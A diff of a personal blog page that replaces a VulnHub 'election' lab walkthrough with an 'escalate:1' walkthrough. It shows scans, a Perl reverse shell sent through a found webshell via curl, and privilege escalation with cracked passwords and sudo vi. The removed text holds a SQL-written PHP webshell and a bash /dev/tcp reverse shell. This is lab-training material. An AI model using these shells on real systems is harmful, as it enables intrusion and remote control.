@@ -16,15 +16,15 @@
   <meta name="author" content="rightevil">
   <meta name="keywords" content="">
   
-    <meta name="description" content="like OSCP&#39;s machine in list">
+    <meta name="description" content="Escalate_Linux - A intentionally developed Linux vulnerable virtual machine.The main focus of this machine is to learn Linux Post Exploitation (Privilege Escalation) Techniques.12+ ways of Privilege E">
 <meta property="og:type" content="article">
-<meta property="og:title" content="vulnhub-wp election">
-<meta property="og:url" content="https://rightevil.github.io/vulnhub-wp-election/index.html">
+<meta property="og:title" content="vulnhub-wp escalate:1">
+<meta property="og:url" content="https://rightevil.github.io/vulnhub-wp-escalate-1/index.html">
 <meta property="og:site_name" content="rightevil">
-<meta property="og:description" content="like OSCP&#39;s machine in list">
+<meta property="og:description" content="Escalate_Linux - A intentionally developed Linux vulnerable virtual machine.The main focus of this machine is to learn Linux Post Exploitation (Privilege Escalation) Techniques.12+ ways of Privilege E">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-03-15T11:48:12.000Z">
-<meta property="article:modified_time" content="2024-03-15T11:58:57.457Z">
+<meta property="article:published_time" content="2024-03-15T16:20:59.000Z">
+<meta property="article:modified_time" content="2024-03-15T16:31:16.779Z">
 <meta property="article:author" content="rightevil">
 <meta property="article:tag" content="vulnhub">
 <meta name="twitter:card" content="summary_large_image">
@@ -33,7 +33,7 @@
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>vulnhub-wp election - rightevil</title>
+  <title>vulnhub-wp escalate:1 - rightevil</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -264,7 +264,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="vulnhub-wp election"></span>
+            <span id="subtitle" data-typed-text="vulnhub-wp escalate:1"></span>
           
         </div>
 
@@ -275,8 +275,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-03-15 19:48" pubdate>
-          2024年3月15日 晚上
+        <time datetime="2024-03-16 00:20" pubdate>
+          2024年3月16日 凌晨
         </time>
       </span>
     
@@ -288,7 +288,7 @@
         <i class="iconfont icon-chart"></i>
         
           <!-- compatible with older versions-->
-          2.9k 字
+          4.2k 字
         
       </span>
     
@@ -300,7 +300,7 @@
         
         
           <!-- compatible with older versions-->
-          25 分钟
+          36 分钟
         
       </span>
     
@@ -346,30 +346,28 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">vulnhub-wp election</h1>
+            <h1 style="display: none">vulnhub-wp escalate:1</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="🖳-host-discover"><a href="#🖳-host-discover" class="headerlink" title="🖳 host discover"></a>🖳 host discover</h1><p><em>sudo netdiscover -r 192.168.165.0/24</em></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                          <br>                                                                                                                                                                       <br>4 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 240                                                                                                        <br>_____________________________________________________________________________<br>  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br>-----------------------------------------------------------------------------<br>192.168.165.14  c6:3b:70:2b:33:1e      2     120  Unknown vendor                                                                                                       <br>192.168.165.196 20:1e:88:ad:<span class="hljs-built_in">fc</span>:55      1      60  Intel Corporate                                                                                                      <br>192.168.165.209 08:00:27:40:48:1a      1      60  PCS Systemtechnik GmbH<br></code></pre></td></tr></table></figure>
-<p>target is <em>192.168.165.209</em></p>
-<h1 id="👁-service-scan"><a href="#👁-service-scan" class="headerlink" title="👁 service scan"></a>👁 service scan</h1><p>nmap scan<br><em>sudo nmap -p- -sV -sC -Pn -oN nmap –min-rate 8000 192.168.165.209</em></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">···<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)<br>|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)<br>|_  256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>|_http-title: Apache2 Ubuntu Default Page: It works<br>MAC Address: 08:00:27:40:48:1A (Oracle VirtualBox virtual NIC)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br>···<br></code></pre></td></tr></table></figure>
+                <h1 id="🖳-host-discover"><a href="#🖳-host-discover" class="headerlink" title="🖳 host discover"></a>🖳 host discover</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo netdiscover -r 192.168.165.0/24<br>Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                          <br>                                                                                                                                                                        <br> 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                                                                        <br> _____________________________________________________________________________<br>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br> -----------------------------------------------------------------------------<br> 192.168.165.14  c6:3b:70:2b:33:1e      1      60  Unknown vendor                                                                                                       <br> 192.168.165.60  08:00:27:ea:fe:25      1      60  PCS Systemtechnik GmbH                                                                                               <br> 192.168.165.196 20:1e:88:ad:<span class="hljs-built_in">fc</span>:55      1      60  Intel Corporate       <br></code></pre></td></tr></table></figure>
+<p>target was <em>192.168.165.60</em></p>
+<h1 id="👁-service-scan"><a href="#👁-service-scan" class="headerlink" title="👁 service scan"></a>👁 service scan</h1><p>nmap scan</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -p- -sV -sC -Pn -oN nmap --min-rate 8000 192.168.165.60<br>···<br>PORT      STATE SERVICE     VERSION<br>80/tcp    open  http        Apache httpd 2.4.29 ((Ubuntu))<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>|_http-title: Apache2 Ubuntu Default Page: It works<br>111/tcp   open  rpcbind     2-4 (RPC <span class="hljs-comment">#100000)</span><br>| rpcinfo: <br>|   program version    port/proto  service<br>|   100000  2,3,4        111/tcp   rpcbind<br>|   100000  2,3,4        111/udp   rpcbind<br>|   100000  3,4          111/tcp6  rpcbind<br>|   100000  3,4          111/udp6  rpcbind<br>|   100003  3           2049/udp   nfs<br>|   100003  3           2049/udp6  nfs<br>|   100003  3,4         2049/tcp   nfs<br>|   100003  3,4         2049/tcp6  nfs<br>|   100005  1,2,3      39060/udp   mountd<br>|   100005  1,2,3      39568/udp6  mountd<br>|   100005  1,2,3      52275/tcp   mountd<br>|   100005  1,2,3      53503/tcp6  mountd<br>|   100021  1,3,4      33553/tcp6  nlockmgr<br>|   100021  1,3,4      39193/tcp   nlockmgr<br>|   100021  1,3,4      53493/udp   nlockmgr<br>|   100021  1,3,4      56884/udp6  nlockmgr<br>|   100227  3           2049/tcp   nfs_acl<br>|   100227  3           2049/tcp6  nfs_acl<br>|   100227  3           2049/udp   nfs_acl<br>|_  100227  3           2049/udp6  nfs_acl<br>139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>445/tcp   open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)<br>2049/tcp  open  nfs         3-4 (RPC <span class="hljs-comment">#100003)</span><br>35337/tcp open  mountd      1-3 (RPC <span class="hljs-comment">#100005)</span><br>39193/tcp open  nlockmgr    1-4 (RPC <span class="hljs-comment">#100021)</span><br>52275/tcp open  mountd      1-3 (RPC <span class="hljs-comment">#100005)</span><br>56035/tcp open  mountd      1-3 (RPC <span class="hljs-comment">#100005)</span><br>MAC Address: 08:00:27:EA:FE:25 (Oracle VirtualBox virtual NIC)<br>Service Info: Host: LINUX<br>···<br></code></pre></td></tr></table></figure>
+<h1 id="🚪🚶-get-shell"><a href="#🚪🚶-get-shell" class="headerlink" title="🚪🚶 get shell"></a>🚪🚶 get shell</h1><p>path brute</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.165.60 -w /usr/share/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.165.60<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/shell.php            (Status: 200) [Size: 29]<br>Progress: 5163 / 5164 (99.98%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure>
+<p>find a webshell page,bound shell!<br>payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">perl -e <span class="hljs-string">&#x27;use Socket;$i=&quot;192.168.165.130&quot;;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;bash -i&quot;);&#125;;&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>url encode-&gt;final payload(<code>https://www.urlencoder.org/</code>)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://192.168.165.60/shell.php?cmd=perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.165.130%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22bash%20-i%22%29%3B%7D%3B%27<br></code></pre></td></tr></table></figure>
 
-<h1 id="🚪🚶-get-shell"><a href="#🚪🚶-get-shell" class="headerlink" title="🚪🚶 get shell"></a>🚪🚶 get shell</h1><p>the apache was 2.4.49,but after trying payload,it seems dont have path traversa<br>and we find four path in robots.txt,finally election work,other was 404.<br>and we could brute the phpmyadmin path by dirb</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirb http://192.168.165.209<br>···<br>---- Scanning URL: http://192.168.165.209/ ----<br>+ http://192.168.165.209/index.html (CODE:200|SIZE:10918)                                                                                                               <br>==&gt; DIRECTORY: http://192.168.165.209/javascript/                                                                                                                       <br>+ http://192.168.165.209/phpinfo.php (CODE:200|SIZE:95563)                                                                                                              <br>==&gt; DIRECTORY: http://192.168.165.209/phpmyadmin/                                                                                                                       <br>+ http://192.168.165.209/robots.txt (CODE:200|SIZE:30)                                                                                                                  <br>+ http://192.168.165.209/server-status (CODE:403|SIZE:280)            <br>···<br></code></pre></td></tr></table></figure>
-<p>and we could login in it by <em>root:toor</em><br><a target="_blank" rel="noopener" href="https://c5cc8144.telegraph-image-1ba.pages.dev/file/42ccc3de0bda161b19f7b.png"></a><br>cause the <code>secure_file_priv</code> was empty,and we are root,so we could write webshell into the web</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">select <span class="hljs-string">&quot;&lt;?php system(<span class="hljs-variable">$_GET</span>[&#x27;cmd&#x27;]);?&gt;&quot;</span> into outfile <span class="hljs-string">&quot;/var/www/html/shell.php&quot;</span><br></code></pre></td></tr></table></figure>
-<p>and visit it in web<br><a target="_blank" rel="noopener" href="https://c5cc8144.telegraph-image-1ba.pages.dev/file/aa963e63af61754a3188f.png"></a><br>then download the weevely shell into the web.(generate by weevely)</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">weevely generate password back.php<br></code></pre></td></tr></table></figure>
-<ul>
-<li><code>password</code> was the pass when connect<br><a target="_blank" rel="noopener" href="https://c5cc8144.telegraph-image-1ba.pages.dev/file/704f22ff687f27d4594e7.png"></a><br>and connect it.<br><a target="_blank" rel="noopener" href="https://c5cc8144.telegraph-image-1ba.pages.dev/file/e4ab0b21e6784d79af005.png"></a><br>this shell was not enough stable and powerful,use</li>
-</ul>
-<p><em>bash -c ‘bash -i &gt;&amp; /dev/tcp/192.168.165.130/443 0&gt;&amp;1’</em><br>bound reverse shell</p>
-<h1 id="🛡️-PE"><a href="#🛡️-PE" class="headerlink" title="🛡️ PE"></a>🛡️ PE</h1><p>find suid binary file<br><em>find / -perm -u=s -type f 2&gt;/dev/null</em><br><a target="_blank" rel="noopener" href="https://c5cc8144.telegraph-image-1ba.pages.dev/file/ca74366ab531de896d598.png"></a><br>the Serv-U was exploit<br><em>searchsploit Serv-U</em><br><a target="_blank" rel="noopener" href="https://c5cc8144.telegraph-image-1ba.pages.dev/file/eb2eb9a604d1520a5c62a.png"></a><br>and get the exploit to the target machine(by wget).<br><a target="_blank" rel="noopener" href="https://c5cc8144.telegraph-image-1ba.pages.dev/file/4f91ed35aab15aeb2298f.png"></a></p>
-<h2 id="rabbit-hole"><a href="#rabbit-hole" class="headerlink" title="rabbit hole"></a>rabbit hole</h2><p>when i run script <em>linpeas.sh</em>, it show /var/spool/cron/ was important, and i found there was <em>/crontabs/root</em> file,and <em>www-data</em> was the owner,have the rw right,so i spend lots of time to try it.but it all fail, cause this directory’s cron must belong to this user,such as <em>/crontabs/root</em> must belong to user:<em>root</em>, and the directory have the <em>drwx-wx–T</em> right, so only root could delete or change the file, even the file’s owner! so the <em>/crontabs/root</em> was fail to excute. cause <em>/crontabs/root</em>‘s owner was <em>www-data</em> not <em>root</em>, and the <em>www-data</em> cant change the owner of <em>/crontabs/root</em>.<br><a target="_blank" rel="noopener" href="https://c5cc8144.telegraph-image-1ba.pages.dev/file/bc29f805067dbf5b46b5d.png"></a><br><a target="_blank" rel="noopener" href="https://c5cc8144.telegraph-image-1ba.pages.dev/file/e4c0a6f9fdfe7c7135b8d.png"></a></p>
-<h1 id="📖-recommend-article"><a href="#📖-recommend-article" class="headerlink" title="📖 recommend article"></a>📖 recommend article</h1><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/election-1,503/">election download</a><br><a target="_blank" rel="noopener" href="https://medium.com/@chicxulub/election-1-vulnhub-walkthrough-341f7bfdf6bc">another’s walkthrough</a></p>
+<h1 id="🛡️-PE"><a href="#🛡️-PE" class="headerlink" title="🛡️ PE"></a>🛡️ PE</h1><h2 id="No-1-user3-shell-PE"><a href="#No-1-user3-shell-PE" class="headerlink" title="No.1 user3/shell PE"></a>No.1 user3/shell PE</h2><p>enum manucal,we find there was a shell binary in /home/user3<br><a target="_blank" rel="noopener" href="https://c5cc8144.telegraph-image-1ba.pages.dev/file/f07c5999b7c4f19bbec3c.png"></a></p>
+<h2 id="No-2-user5-PE"><a href="#No-2-user5-PE" class="headerlink" title="No.2 user5 PE"></a>No.2 user5 PE</h2><p>in /home/user5, there was a script binary file,after we excute command follow user5’s .bash_history,we could get all the users hash<br>and we could crack root’s passwd <code>root:12345</code><br><a target="_blank" rel="noopener" href="https://c5cc8144.telegraph-image-1ba.pages.dev/file/656d3b8bc96a87b6f775c.png"></a><br><a target="_blank" rel="noopener" href="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1e0e34d95cf637152c7f3.png"></a></p>
+<h2 id="No-3-user8-PE"><a href="#No-3-user8-PE" class="headerlink" title="No.3 user8 PE"></a>No.3 user8 PE</h2><p><a target="_blank" rel="noopener" href="https://c5cc8144.telegraph-image-1ba.pages.dev/file/0a9da82e8dc8a8e7b2f97.png"></a><br>from user8’s history, we find the mysql config file,and find the pass of mysql<br><a target="_blank" rel="noopener" href="https://c5cc8144.telegraph-image-1ba.pages.dev/file/00d61d11d02d289a4152a.png"></a><br>and we seletc the password of user:mysql<br><a target="_blank" rel="noopener" href="https://c5cc8144.telegraph-image-1ba.pages.dev/file/14a132ed04e3349dc9af6.png"></a><br>and we find the cred of all user<br><a target="_blank" rel="noopener" href="https://c5cc8144.telegraph-image-1ba.pages.dev/file/e293f2154ea3e24f017c3.png"></a></p>
+<h3 id="user2"><a href="#user2" class="headerlink" title="user2"></a>user2</h3><p>user2 could use user1’s command,but we dont have user1’s passwd,but we could deduce user1 have the same format passwd <code>user1@12345</code>, and it was after trying.<br><a target="_blank" rel="noopener" href="https://c5cc8144.telegraph-image-1ba.pages.dev/file/edd6f037e82469ea6dc5a.png"></a></p>
+<h3 id="user8"><a href="#user8" class="headerlink" title="user8"></a>user8</h3><p>user8 have sudo for vi, so get the root shell by vi(GTFOBins)<br><a target="_blank" rel="noopener" href="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1a471ad7301b909259593.png"></a></p>
+<h1 id="📖-recommend-article"><a href="#📖-recommend-article" class="headerlink" title="📖 recommend article"></a>📖 recommend article</h1><p>cause my ability was limited and i was tired in the night,so i just find this way to PE. author say there was 12+ way of PE<br><a target="_blank" rel="noopener" href="https://c5cc8144.telegraph-image-1ba.pages.dev/file/51a2daeb41c21996e999c.png"></a><br><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/escalate_linux-1,323/">escalate:1 download</a><br><a target="_blank" rel="noopener" href="https://0xa1mn.medium.com/escalate-linux-vulnhub-walkthrough-1945a54d3c03">another walkthrough</a></p>
 
                 
               </div>
@@ -415,8 +413,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>vulnhub-wp election</div>
-      <div>https://rightevil.github.io/vulnhub-wp-election/</div>
+      <div>vulnhub-wp escalate:1</div>
+      <div>https://rightevil.github.io/vulnhub-wp-escalate-1/</div>
     </div>
     <div class="license-meta">
       
@@ -428,7 +426,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年3月15日</div>
+          <div>2024年3月16日</div>
         </div>
       
       
@@ -460,18 +458,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/vulnhub-wp-escalate-1/" title="vulnhub-wp escalate:1">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">vulnhub-wp escalate:1</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/vulnhub-wp-djinn/" title="vulnhub-wp djinn">
-                        <span class="hidden-mobile">vulnhub-wp djinn</span>
+                      <a href="/vulnhub-wp-election/" title="vulnhub-wp election">
+                        <span class="hidden-mobile">vulnhub-wp election</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
